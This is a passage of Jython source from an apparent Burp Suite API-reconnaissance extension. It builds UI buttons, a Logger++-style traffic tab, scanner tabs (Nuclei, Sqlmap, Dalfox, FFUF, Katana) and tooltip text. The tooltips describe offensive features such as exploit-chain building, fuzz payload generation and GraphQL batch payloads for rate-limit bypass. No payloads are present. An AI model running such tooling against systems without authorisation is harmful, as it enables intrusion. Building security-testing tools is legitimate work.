    import_btn.addActionListener(lambda e: self.import_data())

    postman_btn = JButton("Postman")
    postman_btn.setBackground(Color(255, 140, 0))
    postman_btn.setForeground(Color.WHITE)
    postman_btn.addActionListener(lambda e: self._export_postman_collection())

    insomnia_btn = JButton("Insomnia")
    insomnia_btn.setBackground(Color(111, 66, 193))
    insomnia_btn.setForeground(Color.WHITE)
    insomnia_btn.addActionListener(lambda e: self._export_insomnia_collection())

    tool_health_btn = JButton("Tool Health")
    tool_health_btn.setBackground(Color(32, 201, 151))
    tool_health_btn.setForeground(Color.WHITE)
    tool_health_btn.addActionListener(lambda e: self._run_tool_health_check(e))

    grep_btn = JButton("Grep")
    grep_btn.setBackground(Color(111, 66, 193))
    grep_btn.setForeground(Color.WHITE)
    grep_btn.addActionListener(lambda e: self._run_recon_grep())

    turbo_pack_btn = JButton("Turbo Pack")
    turbo_pack_btn.setBackground(Color(255, 87, 34))
    turbo_pack_btn.setForeground(Color.WHITE)
    turbo_pack_btn.addActionListener(lambda e: self._export_recon_turbo_pack())

    hidden_params_btn = JButton("Hidden Params")
    hidden_params_btn.setBackground(Color(255, 193, 7))
    hidden_params_btn.setForeground(Color.BLACK)
    hidden_params_btn.addActionListener(lambda e: self._run_recon_hidden_params())

    param_intel_btn = JButton("Param Intel")
    param_intel_btn.setBackground(Color(0, 150, 136))
    param_intel_btn.setForeground(Color.WHITE)
    param_intel_btn.addActionListener(lambda e: self._run_recon_param_intel())

    export_param_intel_btn = JButton("Export Param Intel")
    export_param_intel_btn.setBackground(Color(23, 162, 184))
    export_param_intel_btn.setForeground(Color.WHITE)
    export_param_intel_btn.addActionListener(lambda e: self._export_recon_param_intel())

    help_btn = JButton("Button Help")
    help_btn.setBackground(Color(108, 117, 125))
    help_btn.setForeground(Color.WHITE)
    help_btn.addActionListener(lambda e: self._show_recon_button_help(e))

    clear_btn = JButton("Clear Data")
    clear_btn.setBackground(Color(220, 53, 69))
    clear_btn.setForeground(Color.WHITE)
    clear_btn.addActionListener(lambda e: self.clear_data())

    refresh_btn = JButton("Refresh")
    refresh_btn.setBackground(Color(108, 117, 125))
    refresh_btn.setForeground(Color.WHITE)
    refresh_btn.addActionListener(lambda e: self._refresh_recon_and_logger_views())

    backfill_now_btn = JButton("Clear + Refill")
    backfill_now_btn.setBackground(Color(13, 110, 253))
    backfill_now_btn.setForeground(Color.WHITE)
    backfill_now_btn.addActionListener(
        lambda e: self._clear_and_refill_recon_logger()
    )

    refresh_invariants_btn = JButton("Refresh Invariants")
    refresh_invariants_btn.setBackground(Color(106, 90, 205))
    refresh_invariants_btn.setForeground(Color.WHITE)
    refresh_invariants_btn.addActionListener(
        lambda e: self._refresh_sequence_invariants_from_recon(e)
    )
    self._apply_component_tooltips(
        {
            export_btn: "Export all captured Recon endpoints and analysis to a JSON file",
            export_host_btn: "Export only endpoints for the selected host filter",
            ai_export_btn: "Export all-tab AI context bundle (Recon, scanners, findings, and LLM-ready files)",
            openapi_generate_btn: "Generate an OpenAPI 3 spec directly from captured Recon traffic in one click",
            import_btn: "Import Recon JSON, Excalibur HAR/session sidecars, or shared bridge bundles (auto-runs invariant refresh for Excalibur imports)",
            postman_btn: "Export scoped endpoints as a Postman Collection v2.1 file",
            insomnia_btn: "Export scoped endpoints as an Insomnia import JSON file",
            tool_health_btn: "Run local CLI compatibility checks for integrated external tools",
            grep_btn: "Search captured request/response history with regex and extract matched groups",
            turbo_pack_btn: "Export Turbo Intruder-ready scripts and request templates from Recon scope",
            hidden_params_btn: "Generate hidden-parameter candidates from Recon scope (Param Miner-style)",
            param_intel_btn: "Build global parameter inventory and overlap view (GAP-style)",
            export_param_intel_btn: "Export the latest Recon parameter-intelligence snapshot",
            help_btn: "Show what each Recon button does",
            clear_btn: "Clear all captured Recon data and reset views",
            refresh_btn: "Refresh both Recon and Logger views from current in-memory data",
            backfill_now_btn: "Clear current Recon/Logger data, then refill both from Burp Proxy history",
            refresh_invariants_btn: "Recompute invariant checks from captured endpoints",
        }
    )

    btn_panel.add(export_btn)
    btn_panel.add(export_host_btn)
    btn_panel.add(ai_export_btn)
    btn_panel.add(openapi_generate_btn)
    btn_panel.add(import_btn)
    btn_panel.add(postman_btn)
    btn_panel.add(insomnia_btn)
    btn_panel.add(tool_health_btn)
    btn_panel.add(grep_btn)
    btn_panel.add(turbo_pack_btn)
    btn_panel.add(hidden_params_btn)
    btn_panel.add(param_intel_btn)
    btn_panel.add(export_param_intel_btn)
    btn_panel.add(help_btn)
    btn_panel.add(clear_btn)
    btn_panel.add(refresh_btn)
    btn_panel.add(backfill_now_btn)
    btn_panel.add(refresh_invariants_btn)
    return btn_panel

def _build_recon_tab(self):
    recon_panel = JPanel(BorderLayout())
    recon_panel.add(self._build_recon_top_panel(), BorderLayout.NORTH)
    recon_panel.add(self._build_recon_center_split(), BorderLayout.CENTER)

    recon_footer_panel = JPanel()
    recon_footer_panel.setLayout(BoxLayout(recon_footer_panel, BoxLayout.Y_AXIS))
    recon_footer_panel.add(self._build_recon_button_panel())
    invariant_status_row = JPanel(FlowLayout(FlowLayout.LEFT))
    invariant_status_row.add(JLabel("Invariants + Golden + State:"))
    self.recon_invariant_status_label = JLabel("")
    self.recon_invariant_status_label.setFont(Font("Monospaced", Font.PLAIN, 11))
    invariant_status_row.add(self.recon_invariant_status_label)
    recon_footer_panel.add(invariant_status_row)
    recon_panel.add(recon_footer_panel, BorderLayout.SOUTH)
    self._refresh_recon_invariant_status_label()
    if bool(getattr(self, "recon_autopopulate_on_open", True)):
        SwingUtilities.invokeLater(lambda: self._backfill_recon_and_logger(force=False))
    return recon_panel

def _create_tabs(self, recon_panel):
    diff_panel = self._create_diff_tab()
    version_panel = self._create_version_tab()
    param_panel = self._create_param_tab()
    logger_panel = self._create_logger_tab()
    fuzzer_panel = self._create_fuzzer_tab()
    sqlmap_verify_panel = self._create_sqlmap_verify_tab()
    dalfox_verify_panel = self._create_dalfox_verify_tab()
    asset_discovery_panel = self._create_api_asset_discovery_tab()
    openapi_drift_panel = self._create_openapi_drift_tab()
    auth_replay_panel = self._create_auth_replay_tab()
    passive_discovery_panel = self._create_passive_discovery_tab()
    apihunter_panel = self._create_apihunter_tab()
    nuclei_panel = self._create_nuclei_tab()
    httpx_panel = self._create_httpx_tab()
    katana_panel = self._create_katana_tab()
    ffuf_panel = self._create_ffuf_tab()
    wayback_panel = self._create_wayback_tab()
    graphql_panel = self._create_graphql_tab()

    self.tabbed_pane.addTab("Recon", recon_panel)
    self.tabbed_pane.addTab("Logger", logger_panel)
    self.tabbed_pane.addTab("Diff", diff_panel)
    self.tabbed_pane.addTab("Version Scanner", version_panel)
    self.tabbed_pane.addTab("Param Miner", param_panel)
    self.tabbed_pane.addTab("Fuzzer", fuzzer_panel)
    self.tabbed_pane.addTab("Auth Replay", auth_replay_panel)
    self.tabbed_pane.addTab("Passive Discovery", passive_discovery_panel)
    self.tabbed_pane.addTab("ApiHunter", apihunter_panel)
    self.tabbed_pane.addTab("Nuclei", nuclei_panel)
    self.tabbed_pane.addTab("HTTPX", httpx_panel)
    self.tabbed_pane.addTab("Katana", katana_panel)
    self.tabbed_pane.addTab("FFUF", ffuf_panel)
    self.tabbed_pane.addTab("Wayback", wayback_panel)
    self.tabbed_pane.addTab("Sqlmap", sqlmap_verify_panel)
    self.tabbed_pane.addTab("Dalfox", dalfox_verify_panel)
    self.tabbed_pane.addTab("Subfinder", asset_discovery_panel)
    self.tabbed_pane.addTab("OpenAPI Drift", openapi_drift_panel)
    self.tabbed_pane.addTab("GraphQL", graphql_panel)
    self._panel.add(self.tabbed_pane, BorderLayout.CENTER)
    self._apply_default_tooltips_recursively(self._panel)

def _create_logger_tab(self):
    """Create Logger++-style tab optimized for long-running sessions."""
    panel = JPanel(BorderLayout())
    self._ensure_logger_default_tag_rules(force=False)

    controls_line1 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line2 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls = controls_line1
    controls.add(JLabel("Filter:"))
    self.logger_filter_field = JTextField("", 20)
    self.logger_filter_field.setToolTipText(
        "Free-text filter across method/tool/host/path/query/tags/status."
    )
    self.logger_filter_field.getDocument().addDocumentListener(
        _LoggerFilterListener(self, delay_ms=240)
    )
    controls.add(self.logger_filter_field)
    regex_label = JLabel("Regex:")
    controls.add(regex_label)
    self.logger_regex_field = JTextField("", 14)
    self.logger_regex_field.setToolTipText(
        "Live regex filter for request/response previews (same engine as Grep Values)."
    )
    self.logger_regex_field.getDocument().addDocumentListener(
        _LoggerFilterListener(self, delay_ms=220)
    )
    controls.add(self.logger_regex_field)
    controls.add(
        self._create_action_button(
            "Save Regex", Color(111, 66, 193), lambda e: self._save_logger_filter()
        )
    )
    controls.add(
        self._create_action_button(
            "Clear Data", Color(220, 53, 69), lambda e: self.clear_data()
        )
    )
    controls.add(JLabel("Saved:"))
    self.logger_filter_library_combo = JComboBox(["(No Saved Filters)"])
    self.logger_filter_library_combo.setToolTipText(
        "Pick a saved regex pattern to populate and apply the Regex field."
    )
    self.logger_filter_library_combo.addActionListener(
        lambda e: (
            None
            if getattr(self, "_syncing_logger_controls", False)
            else self._apply_logger_filter()
        )
    )
    controls.add(self.logger_filter_library_combo)
    controls.add(JLabel("Tool:"))
    self.logger_tool_combo = JComboBox(["All"])
    controls.add(self.logger_tool_combo)
    controls.add(JLabel("Method:"))
    self.logger_method_combo = JComboBox(
        ["All", "GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]
    )
    controls.add(self.logger_method_combo)
    controls.add(JLabel("Status:"))
    self.logger_status_combo = JComboBox(
        ["All", "2xx", "3xx", "4xx", "5xx", "Errors"]
    )
    controls.add(self.logger_status_combo)
    controls.add(JLabel("Show Last:"))
    self.logger_show_last_combo = JComboBox(["200", "500", "1000", "2000", "5000"])
    self.logger_show_last_combo.setSelectedItem("1000")
    controls.add(self.logger_show_last_combo)
    controls.add(JLabel("Max Memory:"))
    self.logger_max_rows_combo = JComboBox(["2000", "5000", "10000", "20000"])
    self.logger_max_rows_combo.setSelectedItem("5000")
    controls.add(self.logger_max_rows_combo)
    self.logger_auto_prune_checkbox = JCheckBox("Auto Prune", True)
    self.logger_auto_prune_checkbox.setToolTipText(
        "Automatically discard oldest rows when memory cap is reached."
    )
    controls.add(self.logger_auto_prune_checkbox)
    self.logger_noise_filter_checkbox = JCheckBox(
        "Filter Noise", bool(getattr(self, "logger_noise_filter_enabled", True))
    )
    self.logger_noise_filter_checkbox.setToolTipText(
        "Hide noisy ad-tech/CDN/static traffic in Logger view."
    )
    controls.add(self.logger_noise_filter_checkbox)
    self.logger_logging_off_checkbox = JCheckBox("Logging Off", False)
    self.logger_logging_off_checkbox.setToolTipText(
        "Hard pause logger capture while keeping existing rows visible."
    )
    controls.add(self.logger_logging_off_checkbox)
    self.logger_import_on_open_checkbox = JCheckBox("Import on Open", True)
    self.logger_import_on_open_checkbox.setToolTipText(
        "Backfill from Burp Proxy history when Logger++ tab is initialized."
    )
    controls.add(self.logger_import_on_open_checkbox)
    controls = controls_line2
    controls.add(JLabel("Export:"))
    self.logger_export_format_combo = JComboBox(["JSONL", "JSON", "CSV"])
    self.logger_export_format_combo.setSelectedItem("JSONL")
    controls.add(self.logger_export_format_combo)
    controls.add(
        self._create_action_button(
            "Grep Values...",
            Color(23, 162, 184),
            lambda e: self._open_logger_grep_popup(),
        )
    )
    controls.add(
        self._create_action_button(
            "Tag Rules...",
            Color(52, 58, 64),
            lambda e: self._open_logger_tag_rules_popup(),
        )
    )
    controls.add(
        self._create_action_button(
            "?",
            Color(108, 117, 125),
            lambda e: self._show_logger_help_popup(),
        )
    )
    self.logger_search_req_checkbox = JCheckBox("Req", True)
    self.logger_search_req_checkbox.setToolTipText("Search regex in request preview")
    controls.add(self.logger_search_req_checkbox)
    self.logger_search_resp_checkbox = JCheckBox("Resp", True)
    self.logger_search_resp_checkbox.setToolTipText("Search regex in response preview")
    controls.add(self.logger_search_resp_checkbox)
    self.logger_in_scope_checkbox = JCheckBox("In Scope", False)
    self.logger_in_scope_checkbox.setToolTipText(
        "Restrict logger view/grep to Burp target scope."
    )
    controls.add(self.logger_in_scope_checkbox)
    controls.add(JLabel("Len >=:"))
    self.logger_len_min_field = JTextField("", 6)
    self.logger_len_min_field.setToolTipText("Only show responses with length >= this value")
    self.logger_len_min_field.getDocument().addDocumentListener(
        _LoggerFilterListener(self, delay_ms=240)
    )
    controls.add(self.logger_len_min_field)
    controls.add(JLabel("Len <=:"))
    self.logger_len_max_field = JTextField("", 6)
    self.logger_len_max_field.setToolTipText("Only show responses with length <= this value")
    self.logger_len_max_field.getDocument().addDocumentListener(
        _LoggerFilterListener(self, delay_ms=240)
    )
    controls.add(self.logger_len_max_field)
    controls.add(
        self._create_action_button(
            "Refresh", Color(108, 117, 125), lambda e: self._refresh_logger_view()
        )
    )
    controls.add(
        self._create_action_button(
            "Backfill History",
            Color(111, 66, 193),
            lambda e: self._logger_backfill_history(force=False),
        )
    )
    controls.add(
        self._create_action_button(
            "Search", Color(23, 162, 184), lambda e: self._run_logger_regex_search()
        )
    )
    controls.add(
        self._create_action_button(
            "Reset", Color(108, 117, 125), lambda e: self._reset_logger_regex_search()
        )
    )
    controls.add(
        self._create_action_button(
            "Save Filter", Color(111, 66, 193), lambda e: self._save_logger_filter()
        )
    )
    controls.add(
        self._create_action_button(
            "Apply Filter", Color(70, 130, 180), lambda e: self._apply_logger_filter()
        )
    )
    controls.add(
        self._create_action_button(
            "Remove Filter", Color(220, 53, 69), lambda e: self._remove_logger_filter()
        )
    )
    controls.add(
        self._create_action_button(
            "Show Selected",
            Color(70, 130, 180),
            lambda e: self._logger_show_selected(),
        )
    )
    endpoint_detail_btn = self._create_action_button(
        "Endpoint Detail",
        Color(23, 162, 184),
        lambda e: self._logger_show_endpoint_detail(),
    )
    endpoint_detail_btn.setToolTipText(
        "Open Recon endpoint details for the selected Logger row (double-click also works)."
    )
    controls.add(endpoint_detail_btn)
    controls.add(
        self._create_action_button(
            "To Repeater",
            Color(32, 201, 151),
            lambda e: self._logger_send_selected_to_repeater(),
        )
    )
    controls.add(
        self._create_action_button(
            "Export View", Color(40, 167, 69), lambda e: self._export_logger_view()
        )
    )
    controls_wrapper = JPanel()
    controls_wrapper.setLayout(BoxLayout(controls_wrapper, BoxLayout.Y_AXIS))
    controls_wrapper.add(controls_line1)
    controls_wrapper.add(controls_line2)
    panel.add(controls_wrapper, BorderLayout.NORTH)

    stats_row = JPanel(FlowLayout(FlowLayout.LEFT))
    self.logger_stats_label = JLabel("Events: 0 | Showing: 0 | Dropped: 0")
    self.logger_stats_label.setFont(Font("Monospaced", Font.PLAIN, 11))
    stats_row.add(self.logger_stats_label)
    panel.add(stats_row, BorderLayout.SOUTH)

    columns = [
        "#",
        "Time",
        "Tool",
        "Method",
        "Host",
        "Path",
        "Query",
        "Status",
        "Len",
        "Type",
        "ReqM",
        "RespM",
        "Tags",
    ]
    self.logger_table_model = _LoggerTableModel(columns, 0)
    self.logger_table = JTable(self.logger_table_model)
    self.logger_table.setFillsViewportHeight(True)
    self.logger_table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF)
    self.logger_row_sorter = TableRowSorter(self.logger_table_model)
    # Keep sorting interactive without resorting on every row update (prevents UI stalls on large refresh/backfill).
    self.logger_row_sorter.setSortsOnUpdates(False)
    self.logger_table.setRowSorter(self.logger_row_sorter)
    self._set_component_tooltip(
        self.logger_table.getTableHeader(),
        "Click a column header to sort. Shift+click adds a second sort key.",
    )
    self.logger_table.setRowSelectionAllowed(True)
    self.logger_table.setColumnSelectionAllowed(False)
    self.logger_table.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION)
    self.logger_table.setRowHeight(max(22, int(self.logger_table.getRowHeight() or 18)))
    logger_renderer = _LoggerTableCellRenderer(self)
    column_model = self.logger_table.getColumnModel()
    for col_idx in range(len(columns)):
        column_model.getColumn(col_idx).setCellRenderer(logger_renderer)
    column_widths = {
        0: 56,   # #
        1: 84,   # Time
        2: 76,   # Tool
        3: 68,   # Method
        4: 210,  # Host
        5: 240,  # Path
        6: 170,  # Query
        7: 64,   # Status
        8: 80,   # Len
        9: 104,  # Type
        10: 62,  # ReqM
        11: 66,  # RespM
        12: 380, # Tags
    }
    for col_idx, width in column_widths.items():
        column = column_model.getColumn(col_idx)
        safe_width = int(width)
        column.setPreferredWidth(safe_width)
        if col_idx == 12:
            column.setMinWidth(300)
        else:
            column.setMinWidth(max(52, int(safe_width * 0.6)))
    logger_popup = JPopupMenu()
    item_select_all = JMenuItem("Select All Rows")
    item_select_all.addActionListener(lambda e: self._logger_select_all_rows())
    logger_popup.add(item_select_all)
    item_copy_selected = JMenuItem("Copy Selected Rows")
    item_copy_selected.addActionListener(lambda e: self._logger_copy_selected_rows())
    logger_popup.add(item_copy_selected)
    item_send_selected = JMenuItem("Send Selected To Repeater")
    item_send_selected.addActionListener(lambda e: self._logger_send_selected_to_repeater())
    logger_popup.add(item_send_selected)
    item_send_ai = JMenuItem("Send Selected To AI Analysis")
    item_send_ai.addActionListener(lambda e: self._logger_send_selected_to_ai())
    logger_popup.add(item_send_ai)
    item_tag_rules = JMenuItem("Tag Rules (Regex)...")
    item_tag_rules.addActionListener(lambda e: self._open_logger_tag_rules_popup())
    logger_popup.add(item_tag_rules)
    self.logger_table.setComponentPopupMenu(logger_popup)
    self.logger_table.addMouseListener(_LoggerPopupMouseListener(self))
    self.logger_table.addMouseListener(_LoggerRowActionMouseListener(self))
    selection_model = self.logger_table.getSelectionModel()
    if selection_model is not None:
        selection_model.addListSelectionListener(_LoggerSelectionListener(self))
    table_scroll = JScrollPane(self.logger_table)
    table_scroll.setBorder(BorderFactory.createTitledBorder("Logger Events"))

    self.logger_request_area = JTextArea()
    self.logger_request_area.setEditable(False)
    self.logger_request_area.setFont(Font("Monospaced", Font.PLAIN, 11))
    request_scroll = JScrollPane(self.logger_request_area)
    request_scroll.setBorder(BorderFactory.createTitledBorder("Request Preview"))

    self.logger_response_area = JTextArea()
    self.logger_response_area.setEditable(False)
    self.logger_response_area.setFont(Font("Monospaced", Font.PLAIN, 11))
    response_scroll = JScrollPane(self.logger_response_area)
    response_scroll.setBorder(BorderFactory.createTitledBorder("Response Preview"))

    lower_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, request_scroll, response_scroll)
    lower_split.setResizeWeight(0.5)
    center_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, table_scroll, lower_split)
    center_split.setResizeWeight(0.7)
    panel.add(center_split, BorderLayout.CENTER)

    self.logger_filter_field.addActionListener(lambda e: self._refresh_logger_view())
    self.logger_tool_combo.addActionListener(lambda e: self._refresh_logger_view())
    self.logger_method_combo.addActionListener(lambda e: self._refresh_logger_view())
    self.logger_status_combo.addActionListener(lambda e: self._refresh_logger_view())
    self.logger_show_last_combo.addActionListener(lambda e: self._refresh_logger_view())
    self.logger_max_rows_combo.addActionListener(
        lambda e: self._logger_apply_runtime_settings()
    )
    self.logger_auto_prune_checkbox.addActionListener(
        lambda e: self._logger_apply_runtime_settings()
    )
    self.logger_logging_off_checkbox.addActionListener(
        lambda e: self._logger_apply_runtime_settings()
    )
    self.logger_import_on_open_checkbox.addActionListener(
        lambda e: self._logger_apply_runtime_settings()
    )
    self.logger_regex_field.addActionListener(lambda e: self._run_logger_regex_search())
    self.logger_search_req_checkbox.addActionListener(lambda e: self._refresh_logger_view())
    self.logger_search_resp_checkbox.addActionListener(lambda e: self._refresh_logger_view())
    self.logger_in_scope_checkbox.addActionListener(lambda e: self._refresh_logger_view())
    self.logger_noise_filter_checkbox.addActionListener(
        lambda e: self._refresh_logger_view()
    )
    self.logger_len_min_field.addActionListener(lambda e: self._refresh_logger_view())
    self.logger_len_max_field.addActionListener(lambda e: self._refresh_logger_view())
    self._logger_apply_runtime_settings()
    self._refresh_logger_view()
    if self.logger_import_on_open_checkbox.isSelected():
        self._maybe_backfill_logger_on_open()
    return panel

def _initialize_output_dir(self):
    import os

    self.output_dir = os.path.join(os.path.expanduser("~"), "burp_APIRecon")
    if not os.path.exists(self.output_dir):
        try:
            os.makedirs(self.output_dir)
        except Exception as e:
            self._callbacks.printError(
                "Failed to create output directory: {}".format(str(e))
            )

def _register_extension_callbacks(self):
    self._callbacks.registerHttpListener(self)
    self._callbacks.registerProxyListener(self)
    self._callbacks.registerContextMenuFactory(self)
    self._callbacks.addSuiteTab(self)

def _create_action_button(self, text, color, action, tooltip=None):
    """Helper to create styled action button"""
    btn = JButton(text)
    btn.setBackground(color)
    btn.setForeground(Color.WHITE)
    btn.addActionListener(action)
    self._set_component_tooltip(
        btn, self._resolve_action_button_tooltip(text, tooltip)
    )
    return btn

def _resolve_action_button_tooltip(self, text, explicit_tooltip=None):
    """Generate consistent tooltips for tab action buttons."""
    if explicit_tooltip is not None:
        return explicit_tooltip

    label = self._ascii_safe(text or "").strip()
    if not label:
        return None

    normalized = label.rstrip(".").strip()
    lower_label = self._ascii_safe(normalized, lower=True).strip()
    direct_map = {
        "target bases": "Open scope editor for base URLs/hosts used by external scanners",
        "pkill tools": "Emergency stop for all external scanner processes launched by this extension",
        "copy": "Copy this tab output text to your system clipboard for AI/reports",
        "copy as curl": "Copy selected/generated attack request as a reusable curl command",
        "clear": "Clear this tab output panel only (does not delete Recon capture data)",
        "clear data": "Clear Recon + Logger captured data and reset both views",
        "compare": "Compare two exported Recon snapshots and list added/removed endpoints",
        "standard": "Load standard version tokens preset into the Versions input field",
        "decimal": "Load decimal version format preset (for example v1.0, v2.1)",
        "environments": "Load environment keyword preset (dev, test, staging, prod)",
        "legacy": "Load legacy/deprecated version keyword preset into input field",
        "all": "Load combined full preset list into this tab input field",
        "admin": "Load admin-privilege parameter keyword preset into Params input",
        "debug": "Load debug/verbose parameter keyword preset into Params input",
        "access": "Load access-control/secret parameter keyword preset into Params input",
        "callback": "Load callback/redirect URL parameter keyword preset into Params input",
        "generate openapi": "Generate an OpenAPI 3 specification from captured Recon traffic and save it to disk",
        "generate": "Generate fuzz payload candidates from Recon endpoints and selected attack type",
        "send to intruder": "Send generated requests/targets to Burp Intruder for manual exploitation",
        "export payloads": "Export generated fuzz payloads from this tab to disk",
        "turbo intruder": "Export a Turbo Intruder-ready script/payload package from current attacks",
        "run verify": "Run verifier against ranked candidates and keep evidence in this tab output",
        "send to recon": "Import verified/discovered results into Recon endpoint inventory",
        "show targets": "Preview target list that this tab will process before launching scans",
        "run subfinder": "Run Subfinder on selected domains and collect discovered asset hosts",
        "browse": "Browse local filesystem and select OpenAPI specification file",
        "detect": "Auto-detect likely OpenAPI spec endpoints from captured traffic history",
        "run drift": "Compare observed traffic against OpenAPI spec to identify drift/missing coverage",
        "run replay": "Replay requests across auth profiles (guest/user/admin) for auth gap checks",
        "extract": "Extract header value from captured traffic into the selected auth profile field",
        "run passive": "Analyze captured traffic only (no active requests) for API risk patterns",
        "run invariants": "Check captured endpoint flows for hidden logic issues (Differential/Sequence/Golden/State/Token Lineage/Parity Drift)",
        "run differential": "Run scoreless counterfactual differentials (representation/auth/identifier drift) from captured traffic only",
        "run token lineage": "Run passive token/session lineage checks (logout/revoke/refresh invalidation drift)",
        "run parity drift": "Run cross-interface parity checks (REST/GraphQL/internal), cache/auth drift, content-type policy drift, and replay-after-delete heuristics",
        "run all advanced": "Run abuse chains, proof mode, spec guardrails, and role delta in one workflow",
        "abuse chains": "Build shortest likely exploit chains (auth -> object access -> state change)",
        "proof mode": "Generate minimal reproducible packet sequences with vulnerable/safe response expectations",
        "spec guardrails": "Derive enforceable auth/param/transition rules from observed traffic and flag violations",
        "role delta": "Compare endpoint behavior across role signals (guest/user/admin) and rank suspicious parity",
        "refresh invariants": "Recompute Differential + Sequence + Golden + State + Token Lineage + Parity Drift checks from Recon data",
        "export": "Export this tab findings to a timestamped file in the project export folder",
        "export ledger": "Save deep-logic artifacts (including differential, token-lineage, and parity-drift findings) to JSON files",
        "run nuclei": "Launch Nuclei with current profile/scope and parse findings back into this tab",
        "export targets": "Export current scoped target URLs prepared for Nuclei execution",
        "probe endpoints": "Run HTTPX on scoped URLs to capture status/title/tech probe output",
        "export urls": "Export probed/reachable URLs from this tab for reuse in other tools",
        "crawl endpoints": "Run Katana crawl on scoped targets to discover additional API paths",
        "export discovered": "Export URLs/endpoints discovered by crawler or passive sources",
        "fuzz directories": "Run FFUF directory/content discovery against scoped API hosts",
        "discover": "Query historical URL sources (Wayback/gau) for archived endpoint paths",
        "run analysis": "Run GraphQL-focused multi-tool workflow and aggregate findings in this tab",
        "analyze schema": "Analyze local GraphQL introspection schema and generate operations/POI output",
        "batch queries": "Export GraphQL batch payloads for rate-limit bypass and DoS safety testing",
        "to repeater": "Send generated GraphQL operations as requests to Burp Repeater tabs",
        "to intruder": "Send generated GraphQL operations as requests to Burp Intruder",
        "scan versions": "Probe version/path variants from input list against captured API base paths",
        "export results": "Export findings shown in this tab to a structured text/JSON artifact",
        "mine params": "Mine parameter candidates from Recon endpoints and rank by operation risk",
        "hidden params": "Generate hidden parameter candidates from scoped Recon endpoints",
        "param intel": "Build global parameter intelligence from scoped Recon captures",
        "export param intel": "Export latest Recon parameter intelligence snapshot",
    }
    if lower_label in direct_map:
        return direct_map[lower_label]

    if lower_label.startswith("run "):
        return "Run {} using current tab settings and scoped targets".format(
            normalized[4:].strip()
        )
    if lower_label.startswith("stop "):
        return "Stop {} process currently running for this tab".format(
            normalized[5:].strip()
        )
    if lower_label.startswith("export "):
        return "Export {} data from this tab to a file".format(normalized[7:].strip())
    if lower_label.startswith("import "):
        return "Import data for {} workflow".format(normalized[7:].strip())
    if lower_label.startswith("send "):
        return "Send selected {} output to the downstream workflow target".format(
            normalized[5:].strip()
        )
    if lower_label.startswith("clear "):
        return "Clear {} data shown in this tab".format(normalized[6:].strip())
    if lower_label.startswith("refresh "):
        return "Refresh {} view with latest in-memory data".format(
            normalized[8:].strip()
        )
    if lower_label.startswith("open "):
        return "Open {} helper dialog".format(normalized[5:].strip())
    if lower_label.startswith("save "):
        return "Save {} configuration to disk".format(normalized[5:].strip())
    if lower_label.startswith("load "):
        return "Load {} configuration from disk".format(normalized[5:].strip())
    if lower_label.startswith("detect "):
        return "Detect {} from captured traffic and tab settings".format(
            normalized[7:].strip()
        )
    if lower_label.startswith("analyze "):
        return "Analyze {} with current tab options".format(normalized[8:].strip())

    return "Run '{}' using current tab context and controls".format(normalized)

def _resolve_checkbox_tooltip(self, text, explicit_tooltip=None):
    """Generate simple, readable tooltips for checkbox controls."""
    if explicit_tooltip is not None:
        return explicit_tooltip

    label = self._ascii_safe(text or "").strip()
    if not label:
        return None
    normalized = label.rstrip(".").strip()
    lower_label = self._ascii_safe(normalized, lower=True).strip()
    direct_map = {
        "auto-capture": "Capture new proxy traffic automatically.",
        "autopopulate": "Load existing proxy history into this tab.",
        "filter noise": "Hide noisy tracker/static requests.",
        "auto prune": "Auto-remove oldest rows when memory is full.",
        "logging off": "Pause new logger captures.",
        "import on open": "Load proxy history when Logger opens.",
        "req": "Apply regex to request preview.",
        "resp": "Apply regex to response preview.",
        "in scope": "Only include items in Burp scope.",
        "lenient json get": "Also include JSON-like GET endpoints.",
        "enable custom": "Use your custom command.",
        "introspection": "Include introspection queries.",
        "batching": "Include batch GraphQL payloads.",
        "aliases": "Include alias-based GraphQL payloads.",
        "depth": "Include deep-nesting GraphQL payloads.",
        "mutations": "Include mutation payloads.",
        "field guess": "Include field-guess payloads.",
        "directives": "Include directive payloads.",
        "fragments": "Include fragment payloads.",
        "include schema ops": "Include schema helper operations.",
        "check unauth": "Also test unauthenticated replay.",
    }
    if lower_label in direct_map:
        return direct_map[lower_label]

    if lower_label.startswith("enable "):
        return "Enable {}.".format(normalized[7:].strip())
    if lower_label.startswith("include "):
        return "Include {}.".format(normalized[8:].strip())
    if lower_label.startswith("check "):
        return "Check {}.".format(normalized[6:].strip())
    return "Turn this option on or off."

def _set_component_tooltip(self, component, text):
    """Apply tooltip text with a single conversion path."""
    if component is None:
        return
    if text is None:
        component.setToolTipText(None)
        return
    try:
        text_type = unicode  # noqa: F821 (Python2/Jython)
    except NameError:
        text_type = str
    tooltip_text = text if isinstance(text, text_type) else text_type(text)
    tooltip_text = tooltip_text.strip()
    component.setToolTipText(tooltip_text if tooltip_text else None)

def _apply_component_tooltips(self, component_tooltips):
    """Apply tooltip text across multiple components."""
    if not isinstance(component_tooltips, dict):
        return
    for component, text in component_tooltips.items():
        self._set_component_tooltip(component, text)

def _apply_default_tooltips_recursively(self, root):
    """Backfill simple tooltips for buttons/checkboxes that miss explicit copy."""
    if root is None:
        return
    stack = [root]
    while stack:
        component = stack.pop()
        if component is None:
            continue
        existing_text = ""
        try:
            existing_text = self._ascii_safe(component.getToolTipText() or "").strip()
        except (AttributeError, TypeError, ValueError):
            existing_text = ""

        if not existing_text:
            if isinstance(component, JButton):
                button_text = self._ascii_safe(component.getText() or "").strip()
                self._set_component_tooltip(
                    component, self._resolve_action_button_tooltip(button_text)
                )
            elif isinstance(component, JCheckBox):
                checkbox_text = self._ascii_safe(component.getText() or "").strip()
                self._set_component_tooltip(
                    component, self._resolve_checkbox_tooltip(checkbox_text)
                )

        try:
            children = component.getComponents()
        except (AttributeError, TypeError, ValueError):
            children = None
        if children:
            for child in children:
                stack.append(child)

def _configure_tooltips(self):
    """Use one deterministic tooltip policy for all tabs."""
    manager = ToolTipManager.sharedInstance()
    manager.setEnabled(True)
    manager.setInitialDelay(350)
    manager.setReshowDelay(100)
    manager.setDismissDelay(20000)

def _build_recon_invariant_status_text(self):
    """Build compact Recon status text for cached invariant artifacts."""
    with self.sequence_invariant_lock:
        sequence_count = len(self.sequence_invariant_findings or [])
